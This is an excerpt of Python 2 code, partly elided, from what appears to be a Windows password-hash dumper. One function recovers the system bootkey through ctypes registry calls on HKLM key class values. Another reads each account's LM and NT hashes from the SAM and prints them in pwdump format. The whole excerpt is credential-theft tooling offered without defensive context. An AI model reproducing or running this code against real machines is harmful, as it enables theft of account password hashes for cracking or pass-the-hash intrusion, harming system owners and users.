...
def dump_hashes():
    bootkey = get_bootkey()
    hbootkey = get_hbootkey(bootkey)
    
    for user in get_user_keys():
        lmhash,nthash = get_user_hashes(user,hbootkey)
        if not lmhash: lmhash = empty_lm
        if not nthash: nthash = empty_nt
        yield "%s:%d:%s:%s:::" % (get_user_name(user), int(user,16), lmhash.encode('hex'), nthash.encode('hex'))
...
def get_hklm_class(rk):
	...
	KEY_READ=0x20019
	hkey = ctypes.c_int(0)
	csize=ctypes.c_int(32)
	vals=ctypes.c_int(0)
	KEY_ALL_ACCESS=0xf003f
	s = ctypes.c_char_p('\000' * 32)
	a.RegOpenKeyExA(HKEY_LOCAL_MACHINE, rk, 0, KEY_READ, ctypes.byref(hkey))
	a.RegQueryInfoKeyA(hkey, s, ctypes.byref(csize), None, None, None, None, ctypes.byref(vals), None, None, None, None)
	return s.value
